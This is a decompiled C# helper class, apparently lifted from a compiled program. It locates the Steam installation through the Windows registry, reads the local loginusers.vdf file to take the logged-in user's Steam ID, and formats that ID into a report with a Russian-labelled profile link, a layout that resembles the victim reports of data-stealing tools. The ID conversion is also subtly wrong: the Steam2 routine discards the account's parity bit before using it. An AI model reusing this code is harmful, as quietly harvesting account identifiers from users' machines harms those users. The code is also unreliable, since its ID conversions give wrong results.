using System;
using System.Globalization;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace file
{
	// Token: 0x0200001D RID: 29
	internal class SteamHelper
	{
		// Token: 0x06000089 RID: 137 RVA: 0x0000A644 File Offset: 0x00008844
		public static long FromSteam2ToSteam64(string accountId)
		{
			bool flag = !Regex.IsMatch(accountId, "^STEAM_0:[0-1]:([0-9]{1,10})$");
			long result;
			if (flag)
			{
				result = (long)SteamHelper.Number0;
			}
			else
			{
				result = SteamHelper.Num64 + Convert.ToInt64(accountId.Substring(10)) * 2L + Convert.ToInt64(accountId.Substring(8, 1));
			}
			return result;
		}

		// Token: 0x0600008A RID: 138 RVA: 0x0000A698 File Offset: 0x00008898
		public static long FromSteam32ToSteam64(long steam32)
		{
			bool flag = steam32 < 1L || !Regex.IsMatch("U:1:" + steam32.ToString(CultureInfo.InvariantCulture), "^U:1:([0-9]{1,10})$");
			long result;
			if (flag)
			{
				result = (long)SteamHelper.Number0;
			}
			else
			{
				result = steam32 + SteamHelper.Num64;
			}
			return result;
		}

		// Token: 0x0600008B RID: 139 RVA: 0x0000A6EC File Offset: 0x000088EC
		public static long FromSteam64ToSteam32(long communityId)
		{
			bool flag = communityId < SteamHelper.Num32 || !Regex.IsMatch(communityId.ToString(CultureInfo.InvariantCulture), "^7656119([0-9]{10})$");
			long result;
			if (flag)
			{
				result = (long)SteamHelper.Number0;
			}
			else
			{
				result = communityId - SteamHelper.Num64;
			}
			return result;
		}

		// Token: 0x0600008C RID: 140 RVA: 0x0000A738 File Offset: 0x00008938
		public static string FromSteam64ToSteam2(long communityId)
		{
			bool flag = communityId < SteamHelper.Num32 || !Regex.IsMatch(communityId.ToString(CultureInfo.InvariantCulture), "^7656119([0-9]{10})$");
			string result;
			if (flag)
			{
				result = string.Empty;
			}
			else
			{
				communityId -= SteamHelper.Num64;
				communityId -= communityId % 2L;
				string text = string.Format("{0}{1}:{2}", "STEAM_0:", communityId % 2L, communityId / 2L);
				bool flag2 = !Regex.IsMatch(text, "^STEAM_0:[0-1]:([0-9]{1,10})$");
				if (flag2)
				{
					result = string.Empty;
				}
				else
				{
					result = text;
				}
			}
			return result;
		}

		// Token: 0x0600008D RID: 141 RVA: 0x0000A7CC File Offset: 0x000089CC
		public static string GetSteamID()
		{
			string path = Path.Combine(SteamHelper.GetLocationSteam("InstallPath", "SourceModInstallPath"), "config\\loginusers.vdf");
			StringBuilder stringBuilder = new StringBuilder();
			string result;
			try
			{
				bool flag = !File.Exists(path);
				if (flag)
				{
					result = null;
				}
				else
				{
					string text = File.ReadAllLines(path)[2].Split(new char[]
					{
						'"'
					})[1];
					bool flag2 = Regex.IsMatch(text, "^7656119([0-9]{10})$");
					if (flag2)
					{
						string str = SteamHelper.FromSteam64ToSteam2(Convert.ToInt64(text));
						string str2 = "U:1:" + SteamHelper.FromSteam64ToSteam32(Convert.ToInt64(text)).ToString(CultureInfo.InvariantCulture);
						stringBuilder.AppendLine("Steam2 ID         | " + str);
						stringBuilder.AppendLine("Steam3 ID x32     | " + str2);
						stringBuilder.AppendLine("Steam3 ID x64     | " + text);
						stringBuilder.AppendLine("Ссылка на аккаунт | https://steamcommunity.com/profiles/" + text);
						result = stringBuilder.ToString();
					}
					else
					{
						result = null;
					}
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600008E RID: 142 RVA: 0x0000A8E8 File Offset: 0x00008AE8
		public static string GetLocationSteam(string Inst = "InstallPath", string Source = "SourceModInstallPath")
		{
			string name = "SOFTWARE\\Wow6432Node\\Valve\\Steam";
			string name2 = "Software\\Valve\\Steam";
			bool flag = true;
			bool flag2 = false;
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, Environment.Is64BitOperatingSystem ? flag : flag2))
				{
					using (RegistryKey registryKey3 = registryKey.OpenSubKey(name2, Environment.Is64BitOperatingSystem ? flag : flag2))
					{
						object obj;
						if (registryKey2 == null)
						{
							obj = null;
						}
						else
						{
							object value = registryKey2.GetValue(Inst);
							obj = ((value != null) ? value.ToString() : null);
						}
						object obj2;
						if ((obj2 = obj) == null)
						{
							if (registryKey3 == null)
							{
								obj2 = null;
							}
							else
							{
								object value2 = registryKey3.GetValue(Source);
								obj2 = ((value2 != null) ? value2.ToString() : null);
							}
						}
						result = obj2;
					}
				}
			}
			return result;
		}

		// Token: 0x0400001D RID: 29
		public const string STEAM2 = "^STEAM_0:[0-1]:([0-9]{1,10})$";

		// Token: 0x0400001E RID: 30
		public const string STEAM32 = "^U:1:([0-9]{1,10})$";

		// Token: 0x0400001F RID: 31
		public const string STEAM64 = "^7656119([0-9]{10})$";

		// Token: 0x04000020 RID: 32
		public const string STEAMPREFIX = "U:1:";

		// Token: 0x04000021 RID: 33
		public const string STEAMPREFIX2 = "STEAM_0:";

		// Token: 0x04000022 RID: 34
		public const string HTTPS = "https://steamcommunity.com/profiles/";

		// Token: 0x04000023 RID: 35
		private static readonly long Num64 = 76561197960265728L;

		// Token: 0x04000024 RID: 36
		private static readonly long Num32 = 76561197960265729L;

		// Token: 0x04000025 RID: 37
		private static readonly int Number0 = 0;
	}
}
